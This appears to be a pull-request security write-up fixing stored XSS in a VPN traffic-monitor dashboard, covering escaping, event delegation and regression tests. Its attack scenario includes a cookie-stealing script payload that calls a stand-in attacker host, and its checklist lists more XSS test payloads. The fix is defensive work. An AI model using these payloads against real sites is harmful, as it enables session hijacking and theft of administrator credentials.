# Stored XSS Vulnerability Fix

## Vulnerability Summary

**Severity**: High (CVSS 8.8 - High)
**Type**: Stored Cross-Site Scripting (XSS)
**Attack Vector**: Network / Authenticated VPN users
**Scope**: Dashboard admin interface

### Description

The Xray traffic monitor dashboard (`static/index.html`) was vulnerable to stored XSS attacks via multiple untrusted data fields that were inserted into the DOM without proper HTML escaping. Any VPN user could inject malicious JavaScript payloads through their connection metadata (destination hostname, username, device info, etc.), which would execute in the browser of dashboard administrators viewing the traffic data.

### Attack Scenario

1. Attacker connects to VPN with malicious destination hostname:
   ```
   evil.io"><script>fetch('//attacker/steal?c='+document.cookie)</script>
   ```

2. Xray logs this destination without validation (before DNS resolution)

3. The malicious payload is stored in the database via the Remnawave API

4. Dashboard admin opens the traffic overview page

5. The payload is rendered via `innerHTML` without escaping:
   ```javascript
   tbody.innerHTML = items.map(d => `
     <td>${d.root_domain}</td>  // VULNERABLE!
   `).join('');
   ```

6. JavaScript executes with admin's session, stealing cookies/tokens

### Impact

- **Session hijacking**: Attacker can steal admin session cookies
- **Account takeover**: Full admin access to the monitoring dashboard
- **Data exfiltration**: Access to all VPN traffic logs and user data
- **Lateral movement**: Potential access to Remnawave API credentials
- **Privilege escalation**: Admin-level actions on behalf of legitimate admins

## Vulnerability Details

### Affected Fields

All fields originating from VPN client connections or Remnawave API responses that were rendered without escaping:

1. **Traffic data**: `root_domain`, `dest` (destination address)
2. **User data**: `username`, `status`, `connected_node`
3. **Connection data**: `inbound`, `outbound`, `node`, `proto`
4. **Device data**: `platform`, `deviceModel`, `osVersion`, `userAgent`, `hwid`
5. **Subscription history**: `clientApp`, `userAgent`, `requestIp`, `srrResponseType`
6. **Node/topology**: `nodeName`, `address`, `providerName`, `tag`, `rule`

### Vulnerable Code Patterns

**Pattern 1: Direct innerHTML injection**
```javascript
tbody.innerHTML = items.map(d => `
  <td>${d.root_domain}</td>  // No escaping
`).join('');
```

**Pattern 2: Inline event handlers with untrusted data**
```javascript
<button onclick="inspectDomain('${d.root_domain}')">  // Can break out of quotes
```

**Pattern 3: HTML attribute injection**
```javascript
<div title="${d.userAgent}">  // Can inject attributes
```

## Fix Implementation

### 1. HTML Escaping Utility

Created `static/escape.js` with comprehensive HTML entity escaping:

```javascript
function escapeHtml(unsafe) {
  if (unsafe == null) return '';
  return String(unsafe)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

This module works in both browser and Node.js environments for testing.

### 2. Applied Escaping to All Untrusted Fields

**Before:**
```javascript
<td>${d.root_domain}</td>
```

**After:**
```javascript
<td>${escapeHtml(d.root_domain)}</td>
```

Applied to **all** fields from API responses across:
- Domains table (lines ~871-887)
- Users table (lines ~1097-1124)
- Live stream table (lines ~1157-1174)
- Inbounds table (lines ~1224-1284)
- HWID devices table (lines ~1651-1674)
- SRH (subscription history) table (lines ~1749-1767)
- Modal content (user/domain inspection)
- Sessions/nodes rendering (lines ~1826-1942)
- Route pathway rendering functions

### 3. Replaced Inline Event Handlers with Event Delegation

**Before (vulnerable to quote escaping):**
```javascript
<button onclick="inspectDomain('${d.root_domain}')">Users</button>
<button onclick="inspectUser(${u.user_id}, '${u.username}')">View</button>
```

**After (safe data attributes + delegation):**
```javascript
<button data-action="inspect-domain" data-domain="${escapeHtml(d.root_domain)}">Users</button>
<button data-action="inspect-user" data-user-id="${u.user_id}" data-username="${escapeHtml(u.username)}">View</button>
```

Added global event delegation:
```javascript
document.addEventListener('click', (e) => {
  const btn = e.target.closest('[data-action]');
  if (!btn) return;
  
  const action = btn.dataset.action;
  if (action === 'inspect-domain') {
    const domain = btn.dataset.domain;
    if (domain) inspectDomain(domain);
  } else if (action === 'inspect-user') {
    const userId = parseInt(btn.dataset.userId, 10);
    const username = btn.dataset.username;
    if (userId && username) inspectUser(userId, username);
  }
});
```

### 4. Fixed Route Pathway Rendering Functions

The `formatRoutePathway()` and `renderInvolvedNodes()` functions handle dynamic topology data (inbound/outbound/node names) which are also untrusted. Added escaping to all fields:

```javascript
return `<span title="${escapeHtml(h.nodeName)}">${escapeHtml(h.shortName)}: ${escapeHtml(h.tag)}</span>`;
```

## Testing

### Test Suite

Created comprehensive test coverage in `test/`:

**`test/escape.test.js`** - Unit tests for escapeHtml():
- Normal strings remain unchanged
- Escapes `<`, `>`, `&`, `"`, `'`
- Handles null/undefined gracefully
- Prevents full XSS payloads

**`test/xss-regression.test.js`** - Regression tests:
- Simulates actual attack vector with malicious `root_domain`
- Verifies vulnerable code would execute scripts
- Verifies fixed code escapes all dangerous characters
- Tests quote-escape attacks in onclick handlers
- Tests multiple fields (dest, inbound, userAgent, etc.)
- Verifies complex nested payloads are neutralized

### Running Tests

```bash
npm test
```

All tests pass successfully, confirming:
1. The escapeHtml function correctly neutralizes XSS payloads
2. The vulnerable code patterns are fixed
3. No regression in legitimate data rendering

## Verification

### Manual Testing Checklist

- [ ] Load dashboard with normal traffic data - renders correctly
- [ ] Insert test payload in destination field via VPN connection
- [ ] Verify payload is escaped in domains table (shows as text, not executed)
- [ ] Verify payload is escaped in live stream
- [ ] Verify payload is escaped in user modal
- [ ] Test with payloads containing: `<script>`, `<img onerror>`, `"><svg/onload>`
- [ ] Verify all buttons still work (inspect domain, inspect user)
- [ ] Check browser console for no JavaScript errors
- [ ] Verify sorting, filtering, search still work

### Before/After Comparison

**Before (vulnerable):**
```html
<td class="px-4 py-2.5">evil.io"><script>alert(document.domain)</script></td>
<!-- Script executes when rendered -->
```

**After (safe):**
```html
<td class="px-4 py-2.5">evil.io&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</td>
<!-- Script is displayed as text, does not execute -->
```

## Files Changed

- `static/escape.js` - NEW: HTML escaping utility module
- `static/index.html` - MODIFIED: Applied escaping to all untrusted fields, replaced inline handlers
- `test/escape.test.js` - NEW: Unit tests for escaping
- `test/xss-regression.test.js` - NEW: Regression tests simulating attack
- `package.json` - MODIFIED: Added `npm test` script

## Security Considerations

### What This Fixes

✅ Stored XSS via destination/domain fields
✅ Stored XSS via username fields
✅ Stored XSS via device/platform/userAgent fields
✅ Stored XSS via inbound/outbound/node names
✅ Stored XSS via subscription history data
✅ Quote-escape attacks in inline event handlers

### What This Doesn't Fix

This patch focuses solely on the dashboard XSS vulnerability. It does **NOT** address:

- Server-side input validation (destination field should be validated before storage)
- API authentication/authorization (separate concern)
- SQL injection (no evidence of this vulnerability)
- CSRF protection (would require separate CSRF tokens)
- Content Security Policy (CSP) headers (recommended additional defense layer)

### Defense in Depth Recommendations

1. **Server-side validation**: Validate destination hostnames match RFC specs before logging
2. **Content Security Policy**: Add CSP headers to prevent inline script execution
3. **HTTP-only cookies**: Ensure session cookies have HttpOnly flag set
4. **Regular security audits**: Automated scanning for XSS vulnerabilities
5. **Input sanitization**: Consider DOMPurify for richer content if needed in future

## Deployment Notes

### Backwards Compatibility

✅ **Fully backwards compatible** - No breaking changes:
- No API changes
- No database schema changes
- No configuration changes required
- All existing functionality preserved
- Visual appearance unchanged

### Deployment Steps

1. Merge this PR to main branch
2. Deploy updated `static/index.html` and `static/escape.js` to web server
3. Clear browser cache or force-reload dashboard (Ctrl+Shift+R)
4. No server restart required (static file changes only)
5. Verify dashboard loads and displays data correctly

### Rollback Plan

If issues arise, revert to previous version:
```bash
git revert <this-commit-sha>
```

Static file changes take effect immediately, no server restart needed.

## Credit

Discovered and fixed by: Claude (Anthropic AI)
Date: 2026-09-26

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [HTML5 Security Cheatsheet](https://html5sec.org/)
